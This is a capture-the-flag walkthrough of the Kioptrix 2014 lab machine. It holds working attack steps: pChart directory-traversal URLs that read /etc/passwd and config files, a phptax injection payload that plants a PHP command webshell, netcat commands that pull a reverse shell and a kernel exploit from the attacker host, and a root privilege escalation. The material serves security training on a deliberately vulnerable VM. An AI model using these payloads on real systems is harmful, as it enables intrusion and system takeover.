#  Kioptrix: 2014 (#5)

https://www.vulnhub.com/entry/kioptrix-2014-5,62/

We discover to find `192.168.1.92`

```
root@kali:~# nmap -sV 192.168.1.92

Starting Nmap 7.60 ( https://nmap.org ) at 2017-09-30 15:36 BST
Nmap scan report for kioptrix2014.home (192.168.1.92)
Host is up (0.010s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
MAC Address: 00:0C:29:3C:84:62 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.18 seconds
```

We see that `http://192.168.1.92:8080` doesnt work for some reason, but `http://192.168.1.92:80` leads to a website. We check the page source to see it uses pchart php library `http://192.168.1.92/pChart2.1.3/examples/index.php`. We can check for vulnerabilities 

```
root@kali:~# searchsploit pchart
----------------------------------------------------------------------- ----------------------------------
 Exploit Title                                                         |  Path
                                                                       | (/usr/share/exploitdb/platforms/)
----------------------------------------------------------------------- ----------------------------------
pChart 2.1.3 - Multiple Vulnerabilities                                | php/webapps/31173.txt
----------------------------------------------------------------------- ----------------------------------
root@kali:~# cat /usr/share/exploitdb/platforms/php/webapps/31173.txt
# Exploit Title: pChart 2.1.3 Directory Traversal and Reflected XSS
# Date: 2014-01-24
# Exploit Author: Balazs Makany
# Vendor Homepage: www.pchart.net
# Software Link: www.pchart.net/download
# Google Dork: intitle:"pChart 2.x - examples" intext:"2.1.3"
# Version: 2.1.3
# Tested on: N/A (Web Application. Tested on FreeBSD and Apache)
# CVE : N/A

[0] Summary:
PHP library pChart 2.1.3 (and possibly previous versions) by default
contains an examples folder, where the application is vulnerable to
Directory Traversal and Cross-Site Scripting (XSS).
It is plausible that custom built production code contains similar
problems if the usage of the library was copied from the examples.
The exploit author engaged the vendor before publicly disclosing the
vulnerability and consequently the vendor released an official fix
before the vulnerability was published.


[1] Directory Traversal:
"hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd"
The traversal is executed with the web server's privilege and leads to
sensitive file disclosure (passwd, siteconf.inc.php or similar),
access to source codes, hardcoded passwords or other high impact
consequences, depending on the web server's configuration.
This problem may exists in the production code if the example code was
copied into the production environment.

Directory Traversal remediation:
1) Update to the latest version of the software.
2) Remove public access to the examples folder where applicable.
3) Use a Web Application Firewall or similar technology to filter
malicious input attempts.


[2] Cross-Site Scripting (XSS):
"hxxp://localhost/examples/sandbox/script/session.php?<script>alert('XSS')</script>
This file uses multiple variables throughout the session, and most of
them are vulnerable to XSS attacks. Certain parameters are persistent
throughout the session and therefore persists until the user session
is active. The parameters are unfiltered.

Cross-Site Scripting remediation:
1) Update to the latest version of the software.
2) Remove public access to the examples folder where applicable.
3) Use a Web Application Firewall or similar technology to filter
malicious input attempts.


[3] Disclosure timeline:
2014 January 16 - Vulnerability confirmed, vendor contacted
2014 January 17 - Vendor replied, responsible disclosure was orchestrated
2014 January 24 - Vendor was inquired about progress, vendor replied
```

Here, we can test for directory traversal and get results from `http://192.168.1.92/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd`. We can also check the configuration files `http://192.168.1.92/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf`

```
SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser  
  
<VirtualHost *:8080>  
    DocumentRoot /usr/local/www/apache22/data2  
  
 <Directory "/usr/local/www/apache22/data2">  
  Options Indexes FollowSymLinks  
  AllowOverride All  
  Order allow,deny  
  Allow from env=Mozilla4_browser  
 </Directory>  
  
</VirtualHost>
```

## Remote Code Injection 

Here we see that it only works for user-agent Mozilla/4.0. no wonder why it didn't work earlier. We can spoof this through extensions, Mozilla's about:config or Chrome DevTools. Now we see a site that uses phptax -- another library. We can use metasploit to exploit this e.g. `msf > use exploit/multi/http/phptax_exec ` or we can use an exploit found on exploitdb https://www.exploit-db.com/exploits/25849/. 

Couldn't get the php to work, but doing it manually is just fine:

```
http://192.168.1.92:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru%28%24_GET[cmd]%29%3B%3F%3E

http://192.168.1.92:8080/phptax/data/rce.php?cmd=id (it works! we can execute any commands from here, now we just need to escalate our privleges. It may be easier to upload a php shell as shown below for convenience)

root@kali:~/test# nc -lvp 1234 < /usr/share/webshells/php/php-reverse-shell.php (remember to change the reverse-shell IP and port to the Kali Linux attacker's VM)
listening on [any] 1234 ...
(execute on browser: http://192.168.1.92:8080/phptax/data/rce.php?cmd=nc -nv 192.168.1.88 1234 > php-reverse-shell.php)
connect to [192.168.1.88] from kioptrix2014.home [192.168.1.92] 58689

root@kali:~/test# nc -lvp 1234   
(execute on browser http://192.168.1.92:8080/phptax/data/php-reverse-shell.php, some reason it took a few tries)
listening on [any] 1234 ...
connect to [192.168.1.88] from kioptrix2014.home [192.168.1.92] 53880
FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan  3 07:46:30 UTC 2012     root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  amd64
 2:33PM  up 41 mins, 0 users, load averages: 0.03, 0.05, 0.00
USER       TTY      FROM                      LOGIN@  IDLE WHAT
uid=80(www) gid=80(www) groups=80(www)
sh: can't access tty; job control turned off
```


## Privelege Escalation

The typical goto method is the find exploits of the OS, we check `uname -a` and found an exploit https://www.exploit-db.com/exploits/28718/. From here it is just the simple case of 

```
root@kali:~/test# nc -lvp 1234 < exploit.c
listening on [any] 1234 ...
(execute on browser: http://192.168.1.92:8080/phptax/data/rce.php?cmd=nc -nv 192.168.1.88 1234 > exploit.c)
connect to [192.168.1.88] from kioptrix2014.home [192.168.1.92] 45527
http://192.168.1.92:8080/phptax/data/rce.php?cmd=gcc exploit.c -o exploit
http://192.168.1.92:8080/phptax/data/rce.php?cmd=./exploit
http://192.168.1.92:8080/phptax/data/rce.php?cmd=id
uid=0(root) gid=0(wheel) groups=0(wheel) 
```
